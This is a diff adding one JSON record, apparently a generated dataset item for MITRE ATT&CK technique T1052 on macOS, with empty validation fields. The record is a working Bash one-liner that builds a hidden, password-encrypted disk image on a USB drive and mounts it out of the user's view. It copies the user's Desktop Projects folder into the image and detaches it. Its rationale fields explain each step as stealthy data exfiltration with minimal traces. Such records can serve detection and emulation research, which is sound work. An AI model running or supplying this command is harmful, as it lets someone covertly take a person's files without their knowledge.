@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "printf 's3cr3tP@ss\\n' | hdiutil create -type SPARSEBUNDLE -size 1g -fs HFS+J -encryption AES-256 -stdinpass -volname \".bk\" /Volumes/USB/.bk.sparsebundle && printf 's3cr3tP@ss\\n' | hdiutil attach -stdinpass -nobrowse -mountpoint /Volumes/.bk /Volumes/USB/.bk.sparsebundle && cp -pR ~/Desktop/Projects /Volumes/.bk/ && hdiutil detach /Volumes/.bk",
+  "explanation": "Builds an encrypted sparsebundle on USB, stealthily mounts it, copies data incrementally, and detaches to persist on removable media.",
+  "rationale_steps": [
+    "Create expandable container to minimize write footprint over time.",
+    "Mount with -nobrowse to reduce user visibility.",
+    "Copy target data locally into the container on the USB.",
+    "Detach to finalize exfil payload with minimal artifacts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-19e64b98-5cab12e5",
+  "source_prompt_hash": "19e64b98",
+  "timestamp_utc": "2025-09-30T05:31:52.812086Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
